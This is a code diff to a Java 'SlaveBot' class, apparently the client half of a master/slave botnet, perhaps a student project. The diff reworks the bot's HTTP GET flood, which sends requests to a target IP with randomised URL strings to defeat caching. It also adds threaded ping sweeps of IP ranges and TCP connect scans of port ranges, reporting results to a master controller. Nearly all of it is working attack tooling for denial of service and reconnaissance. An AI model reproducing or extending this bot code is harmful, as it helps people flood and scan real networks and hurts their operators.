@@ -2,12 +2,16 @@ import java.net.*;
 import java.util.*;
 import java.io.*;
 
-public class SlaveBot
+public class SlaveBot extends Thread
 {
 //--variable declarations----------------------------------------------------------------------------------------------------------------------
 	static ArrayList<Socket> connectedToRemoteHost = new ArrayList<>();
 	static HashMap<String, ArrayList<Socket>> slavetoRemote = new HashMap<String, ArrayList<Socket>>();
+	static MasterBot m = new MasterBot();
 	Socket DDoS;
+	Socket socketSelected;
+	Socket portScanSocket;
+	static String ipStringRange, portStringRange, target; 
 //--main---------------------------------------------------------------------------------------------------------------------------------------
 	public static void main(String[] args) 
 	{
@@ -108,11 +112,15 @@ public class SlaveBot
 			// if url functionality is provided by the master
 			if (url != "" && url != null) 
 			{
+				if(url.length() == 4)
+				{
+					url = url+getRandomString();
+				}
 				BufferedWriter bw = new BufferedWriter (new OutputStreamWriter(DDoS.getOutputStream()));
 				BufferedReader br = new BufferedReader (new InputStreamReader(DDoS.getInputStream()));
-				bw.write("GET " + url + getRandomString() + "HTTP/1.1\n\nHost: "+ targetIP);
+				bw.write("GET " + url + "HTTP/1.1\n\nHost: "+ targetIP);
 				bw.flush();
-				System.out.println(br.readLine() + " random string used " + url + getRandomString() + "\n");
+				System.out.println(br.readLine() + " random string used : " + url + "\n");
 				bw.close();
 				br.close();
 			}
@@ -159,17 +167,120 @@ public class SlaveBot
 			e.printStackTrace();
 		}
 	}
+//--ipScan-------------------------------------------------------------------------------------------------------------------------------------
+	public void ipScan(Socket selectedSocket, String ipRangeString) throws IOException
+	{
+		socketSelected = selectedSocket;
+		ipStringRange = ipRangeString;
+		Runnable r1 = new Runnable1();	 
+		Thread t1 = new Thread(r1);
+		t1.start();
+	}
+//--ipscan-------------------------------------------------------------------------------------------------------------------------------------
+	public void tcpPortScan(Socket selectedSocket, String portRangeString, String targetIPAddress) throws IOException
+	{
+		socketSelected = selectedSocket;
+		portStringRange = portRangeString;
+		target = targetIPAddress;
+		Runnable r2 = new Runnable2();	 
+		Thread t2 = new Thread(r2);
+		t2.start();
+	}
 //--getRandomString----------------------------------------------------------------------------------------------------------------------------
 	public String getRandomString()
 	{
 		char[] charStream = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
 		StringBuilder stringBuilder = new StringBuilder();
 		Random random = new Random();
-		for (int i = 0; i < 20; i++) {
+		for (int i = 0; i < 10; i++) {
 		    char c = charStream[random.nextInt(charStream.length)];
 		    stringBuilder.append(c);
 		}
 		String randomString = stringBuilder.toString();
 		return randomString;
 	}
-}	
+//--Runnable1 class method for ipscan thread--------------------------------------------------------------------------------------------------------------------
+	class Runnable1 implements Runnable
+	{
+//------run() method for threads--------------------------------------------------------------------------------------------------------------------
+		public void run()
+		{
+			try
+			{
+				ArrayList<String> listOfResponsdedTarget = new ArrayList<String>();
+				String[] range = ipStringRange.split("-");
+				String[] tupleStart = range[0].split("\\.");
+				String[] tupleEnd = range[1].split("\\.");
+		
+				long result1 = 0;
+				long result2 = 0;
+				
+				for (int i = 0; i < tupleStart.length; i++) 
+				{
+					int power = 3 - i;
+					int ip = Integer.parseInt(tupleStart[i]);
+					result1 += ip * Math.pow(256, power);
+				}
+				
+				for (int i = 0; i < tupleEnd.length; i++) 
+				{
+					int power = 3 - i;
+					int ip = Integer.parseInt(tupleEnd[i]);
+					result2 += ip * Math.pow(256, power);
+				}
+				
+				for (long i = result1; i < (result2 + 1); ++i)
+				{
+					long new_result1 = i;
+					String ipString;
+					StringBuilder sb = new StringBuilder(15);
+					for (int j = 0; j < 4; j++) 
+					{
+						sb.insert(0,Long.toString(new_result1 & 0xff));
+						if (j < 3) 
+						{
+							sb.insert(0,'.');
+						}
+						new_result1 = new_result1 >> 8;
+					}
+					ipString = sb.toString();
+					InetAddress ip = InetAddress.getByName(ipString);
+
+					if(ip.isReachable(200))
+					{
+						listOfResponsdedTarget.add(ipString);
+					}
+				}		
+				m.printIpScan(listOfResponsdedTarget);
+			} catch(IOException e)
+			{
+				System.out.println("ipScan Failure.");
+				e.printStackTrace();
+			}
+		}
+	}
+//--Runnable1 class method for ipscan thread--------------------------------------------------------------------------------------------------------------------
+	class Runnable2 implements Runnable
+	{
+//------run() method for threads--------------------------------------------------------------------------------------------------------------------
+		public void run()
+		{
+			ArrayList<String> activePorts = new ArrayList<String>();
+			String[] range = portStringRange.split("-");		
+			for(int i = Integer.parseInt(range[0]); i < Integer.parseInt(range[1])+1; i++)
+			{
+				try
+				{	
+					portScanSocket = new Socket();
+					portScanSocket.connect(new InetSocketAddress(target,i), 200);
+					activePorts.add(Integer.toString(i));
+					portScanSocket.close();
+				}catch(IOException e)
+				{
+
+				}
+			}
+			m.printtcpPortScan(activePorts);
+		}
+	}	
+}
